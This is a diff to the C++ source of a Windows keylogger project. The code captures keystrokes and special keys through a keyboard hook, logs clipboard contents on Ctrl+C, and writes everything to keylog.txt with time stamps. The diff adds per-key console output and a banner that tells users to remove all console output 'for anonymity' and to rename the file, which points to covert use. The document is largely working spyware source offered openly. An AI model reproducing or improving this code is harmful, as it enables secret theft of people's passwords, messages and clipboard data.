@@ -35,53 +35,67 @@ void logkeyStroke(int key) {
     // Get current time
     auto now = std::chrono::system_clock::now();
     auto now_c = std::chrono::system_clock::to_time_t(now);
-    logfile << std::put_time(std::localtime(&now_c), "\n [ %d-%m-%Y ] - ") << "";
+    logfile << std::put_time(std::localtime(&now_c), "\n [ %d-%m-%Y ] (%X) - ") << "";
 
     // Handle special keys
     switch (key) {
         case VK_BACK:
             logfile << "[ BACKSPACE ]";
+            std::cout << "\n[!] Logged (BACKSPACE)";
             break;
         case VK_RETURN:
             logfile << "[ ENTER ]";
+            std::cout << "\n[!] Logged (ENTER)";
             break;
         case VK_SPACE:
             logfile << "[ SPACE ]";
+            std::cout << "\n[!] Logged (SPACE)";
             break;
         case VK_TAB:
             logfile << "[ TAB ]";
+            std::cout << "\n[!] Logged (TAB)";
             break;
         case VK_ESCAPE:
             logfile << "[ ESC ]";
+            std::cout << "\n[!] Logged (ESC)";
             break;
         case VK_CAPITAL:
             logfile << "[ CAPSLOCK ]";
+            std::cout << "\n[!] Logged (CAPSLOCK)";
             break;
         
         // Handling SHIFT KeyStroke
         case VK_SHIFT:
             logfile << "[ SHIFT ]";
+            std::cout << "\n[!] Logged (SHIFT)";
             break;
         case VK_LSHIFT:
             logfile << "[ LSHIFT ]";
+            std::cout << "\n[!] Logged (LSHIFT)";
             break;
         case VK_RSHIFT:
             logfile << "[ RSHIFT ]";
+            std::cout << "\n[!] Logged (RSHIFT)";
             break;
 
         // Handling CRTL KeyStroke
         case VK_CONTROL:
             logfile << "[ CTRL ]";
+            std::cout << "\n[!] Logged (CTRL)";
             break;
         case VK_LCONTROL:
             logfile << "[ LCTRL ]";
+            std::cout << "\n[!] Logged (LCTRL)";
             break;
         case VK_RCONTROL:
             logfile << "[ RCTRL ]";
+            std::cout << "\n[!] Logged (RCTRL)";
             break;
 
         case VK_DELETE:
             logfile << "[ DELETE ]";
+            std::cout << "\n[!] Logged (DELETE)";
+            
             break;
         
         // Handling AlphaNumeric KeyStrokes
@@ -99,7 +113,9 @@ void logkeyStroke(int key) {
                 logfile << char(key);
             } else {
                 logfile << "[ " << key << " ]";
+                
             }
+            std::cout << "\n[!] Logged (" << char(key) << ")";
             break;
     }
     
@@ -109,7 +125,7 @@ void logkeyStroke(int key) {
     else 
         if((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (key == 'c'))
             logClipboardContent();
-    std::cout << "\n[!] Logged (" << char(key) << ")";
+    
 logfile.flush(); // Ensure the log is written immediately
 }
 
@@ -126,20 +142,21 @@ int main() {
 
 // Banner
 std::cout << "--------------------------------------------------";
- std::cout << "\n _  __          _                                 ";
- std::cout << "\n| |/ /         | |                                ";
- std::cout << "\n| ' / ___ _   _| |     ___   __ _  __ _  ___ _ __ ";
- std::cout << "\n|  < / _ | | | | |    / _   / _` |/ _` |/ _ | '__|";
- std::cout << "\n| . |  __| |_| | |___| (_) | (_| | (_| |  __| |   ";
- std::cout << "\n|_| _ ___| __, |______ ___/  __, | __, | ___|_|   ";
- std::cout << "\n           __/ |             __/ | __/ |          ";
- std::cout << "\n          |___/             |___/ |___/           ";
- std::cout << "\n--------------------------------------------------";
- std::cout << "\n As a Project By @shahil-sk";
- std::cout << "\n--------------------------------------------------";
- std::cout << "\n[*] Starting Application";
-
-
+ std::cout << "\n  _  __          _                                 ";
+ std::cout << "\n | |/ /         | |                                ";
+ std::cout << "\n | ' / ___ _   _| |     ___   __ _  __ _  ___ _ __ ";
+ std::cout << "\n |  < / _ | | | | |    / _   / _` |/ _` |/ _ | '__|";
+ std::cout << "\n | . |  __| |_| | |___| (_) | (_| | (_| |  __| |   ";
+ std::cout << "\n |_| _ ___| __, |______ ___/  __, | __, | ___|_|   ";
+ std::cout << "\n            __/ |             __/ | __/ |          ";
+ std::cout << "\n           |___/             |___/ |___/           ";
+ std::cout << "\n --------------------------------------------------";
+ std::cout << "\n   A Simple Keylogging Project By @shahil-sk";
+ std::cout << "\n --------------------------------------------------";
+ std::cout << "\n   - Remove All 'std::cout' for anonymity";
+ std::cout << "\n   - Change filename ";
+ std::cout << "\n --------------------------------------------------";
+ std::cout << "\n\n[*] Starting Application";
     logfile.open("keylog.txt", std::ios::app);
     if (!logfile.is_open()) {
         std::cerr << "Failed to open log file." << std::endl;
@@ -166,6 +183,6 @@ std::cout << "--------------------------------------------------";
     UnhookWindowsHookEx(KeyboardHook);
     logfile.close(); // Close the log file when done
     std::cout << "[-] Logfile Closed";
-    getch();
+    std::cout << "[*] Application Closed";
     return 0;
 }
